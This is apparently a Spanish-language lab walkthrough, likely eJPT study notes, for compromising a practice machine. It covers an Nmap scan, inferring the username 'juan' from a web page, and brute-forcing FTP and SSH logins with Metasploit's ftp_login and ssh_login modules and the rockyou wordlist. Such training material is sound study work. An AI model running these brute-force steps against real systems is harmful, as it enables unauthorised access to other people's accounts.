1. Lanzar un Nmap a la victima:
	```
	sudo nmap -p- --open -sS -sVC --min-rate 5000 -A -n -vvv -Pn 192.168.8.135 -oN Friendly3_Puertos.txt
	```

2. Ver el resultado:
```
cat Friendly3_Puertos.txt
```

![Metasploit 5](ejpt/img/metasploit-5.png)

3. Bucamos la IP de la victima en un navegador (Chrome, Firefox...) para ver que tiene guardado en el puerto 80 (HTTP):
	![Hydra 2](ejpt/img/hydra-2.png)
4. Como el mensaje esta firmado por ***Juan*** podemos intuir que el usuario es ***juan***.
5. Utilizamos la herramienta ***METASPLOIT*** para hacer un ataque de fuerza bruta a los dos servicios (FTP y SSH):
	1.  ***FTP:***
		1.  Abrimos **Metasploit**:
		```
		msfconsole
		```

		2. Buscamos el modulo **ftp_login**:
		```
		search ftp_login
		```
		![Metasploit 6](ejpt/img/metasploit-6.png)

		3. Seleccionamos el modulo utilizando el nombre o el numero:
		```
		use auxiliary/scanner/ftp/ftp_login
		```
		También se puede utilizar el numero (es lo mismo):
		```
		use 0
		```

		4. Abrimos el menú de configuración del modulo:
		```
		show options
		```
		![Metasploit 7](ejpt/img/metasploit-7.png)
		5. Elegimos el diccionario de contraseñas:
		```
		set PASS_FILE /usr/share/wordlists/rockyou.txt
		```

		6. Ponemos el usuario (Ya hemos visto por el puerto 80 que el usuario es "juan"):
		```
		set USERNAME juan
		```

		7. Ponemos la IP de la maquina victima:
		```
		set RHOSTS 192.168.8.105
		```

		8. Iniciamos el ataque de fuerza bruta:
		```
		run
		```
		![Metasploit 8](ejpt/img/metasploit-8.png)
		
		9. Iniciamos sesión por FTP:
		```
		ftp juan@192.168.8.105
		```

	2. ***SSH:***
		1.  Abrimos **Metasploit**:
		```
		msfconsole
		```

		2. Buscamos el modulo **ssh_login**:
		```
		search ssh_login
		```
		![Metasploit 9](ejpt/img/metasploit-9.png)

		3. Seleccionamos el modulo utilizando el nombre o el numero:
		```
		use auxiliary/scanner/ssh/ssh_login
		```
		Tambien se puede utilizar el numero (es lo mismo):
		```
		use 0
		```

		4. Abrimos el menú de configuración del modulo:
		```
		show options
		```
		![Metasploit 10](ejpt/img/metasploit-10.png)
		5. Elegimos el diccionario de contraseñas:
		```
		set PASS_FILE /usr/share/wordlists/rockyou.txt
		```

		6. Ponemos el usuario (Ya hemos visto por el puerto 80 que el usuario es "juan"):
		```
		set USERNAME juan
		```

		7. Ponemos la IP de la maquina victima:
		```
		set RHOSTS 192.168.8.105
		```

		8. **OPCIONAL:** Activar el Verbose (Para que te muestre cada intento fallido):
		```
		set VERBOSE true
		```
		![Metasploit 11](ejpt/img/metasploit-11.png)

		9. Iniciamos el ataque de fuerza bruta:
		```
		run
		```

		10. Iniciamos sesión por SSH:
		```
		ssh juan@192.168.8.105
		```